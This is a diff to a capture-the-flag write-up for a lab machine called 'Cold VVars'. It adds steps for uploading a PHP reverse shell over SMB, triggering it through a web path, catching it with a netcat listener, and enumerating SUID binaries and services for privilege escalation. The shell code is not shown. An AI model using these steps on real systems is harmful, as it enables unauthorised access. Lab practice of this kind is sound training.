@@ -1,3 +1,9 @@
+<h1>Cold VVars</h1>
+<p>2025, August 11 - Day 462</p>
+
+<br>
+
+<img width="1888" height="383" alt="image" src="https://github.com/user-attachments/assets/45dbbc72-2339-4f42-9386-db65d132d474" />
 
 
 <br>
@@ -222,26 +228,32 @@ Username Password<br>Tove             Jani<br>Godzilla             KONGistheKING
 ```
 
 <br>
-
-<img width="1278" height="152" alt="image" src="https://github.com/user-attachments/assets/85516a66-552a-4d25-b5f2-06d1c2737c8b" />
-
+<br>
 <br>
 <h3>Reverse Shell</h3>
+<p>
+
+- created a simple PHP reverse shell</p>
+
+<br>
 
 ```bash
 :~/ColdVVars# smbclient //coldvvars.thm/SECURED -U ArthurMorgan
 Password for [WORKGROUP\ArthurMorgan]:
 Try "help" to get a list of possible commands.
-smb: \> put rev.txt
-putting file rev.txt as \rev.txt (1788.7 kb/s) (average 1788.7 kb/s)
+smb: \> put rev.php
+putting file rev.php as \rev.txt (1788.7 kb/s) (average 1788.7 kb/s)
 smb: \>
 ```
 
 <br>
+<h3><code>coldvvars.thm:8080/dev/rev.txt</code></h3>
 
-```bash
-http://coldvvars.thm:8080/dev/rev.txt
-```
+<p>
+
+- navigated to <code>rev.txt</code></p>
+
+
 <br>
 
 ```bash
@@ -308,24 +320,7 @@ Sorry, user ArthurMorgan may not run sudo on ip-xx-xxx-xx-xxx.
 
 ```bash
 ArthurMorgan@iip-xx-xxx-xx-xxx:~$ find / -perm -4000 -user root -type f 2>/dev/null
-/snap/snapd/23771/usr/lib/snapd/snap-confine
-/snap/snapd/24718/usr/lib/snapd/snap-confine
-/snap/core20/2599/usr/bin/chfn
-/snap/core20/2599/usr/bin/chsh
-/snap/core20/2599/usr/bin/gpasswd
-/snap/core20/2599/usr/bin/mount
-/snap/core20/2599/usr/bin/newgrp
-/snap/core20/2599/usr/bin/passwd
-/snap/core20/2599/usr/bin/su
-/snap/core20/2599/usr/bin/sudo
-/snap/core20/2599/usr/bin/umount
-/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/snap/core20/2599/usr/lib/openssh/ssh-keysign
-/snap/core20/2501/usr/bin/chfn
-/snap/core20/2501/usr/bin/chsh
-/snap/core20/2501/usr/bin/gpasswd
-/snap/core20/2501/usr/bin/mount
-/snap/core20/2501/usr/bin/newgrp
+...
 /snap/core20/2501/usr/bin/passwd
 /snap/core20/2501/usr/bin/su
 /snap/core20/2501/usr/bin/sudo
@@ -351,6 +346,8 @@ ArthurMorgan@iip-xx-xxx-xx-xxx:~$ find / -perm -4000 -user root -type f 2>/dev/n
 /sbin/mount.cifs
 ```
 
+<br>
+
 ```bash
 ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
 127.0.0.1       localhost
@@ -358,6 +355,7 @@ ArthurMorgan@ip-xx-xxx-xx-xxx:~$ getent hosts
 127.0.0.1       ip6-localhost ip6-loopback
 ```
 
+<br>
 
 ```bash
 ArthurMorgan@ip-xx-xxx-xx-xxx:~$ netstat -tunlp
@@ -417,9 +415,11 @@ ArthurMorgan@ip-xx-xxx-xx-xxx: ./linpeas.sh -a
 
 ```bash
 ArthurMorgan@ip-xx-xxx-xx-xxx:/dev/shm$ nc -nlvp 4545
+...
 ```
 
-<img width="1263" height="183" alt="image" src="https://github.com/user-attachments/assets/065658b1-e97d-41eb-a908-13c89bfbc4bf" />
+<img width="1308" height="272" alt="image" src="https://github.com/user-attachments/assets/a664c8ad-a0a7-4ae9-8492-61288e2af294" />
+
 
 <br>
 
@@ -477,6 +477,10 @@ marston@ip-xx-xxx-xx-xxx:~$ tmux ls
 marston@ip-xx-xxx-xx-xxx:~$ tmux attach -t 0
 ```
 
+
+
+
+<p>Need to learn more to continue ...</p>
 
 
 
